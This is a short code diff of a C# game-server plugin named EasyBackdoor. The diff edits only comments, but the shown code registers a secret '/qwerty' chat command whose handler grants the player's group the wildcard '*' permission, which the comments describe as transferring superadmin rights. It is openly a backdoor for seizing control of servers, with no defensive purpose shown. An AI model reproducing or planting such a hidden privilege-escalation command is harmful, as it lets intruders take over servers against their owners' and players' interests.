@@ -41,13 +41,13 @@ namespace EasyBackdoor
 			Order = +4;
 		}
 
-		// This is command that will transfer superadmin perms into your account for free. 
+		// We must add new command in my case i added //qwerty command!
 		public override void Initialize()
 		{
 			Commands.ChatCommands.Add(new Command(backdoor, "/qwerty"));
 		}
 
-		// This script will transfer superadmin perms into your account for free.
+		// This will be our script that will transfer (SuperAdmin) perms into our group.
 		void backdoor(CommandArgs args)
 		{
 			args.Player.Group.AddPermission("*");
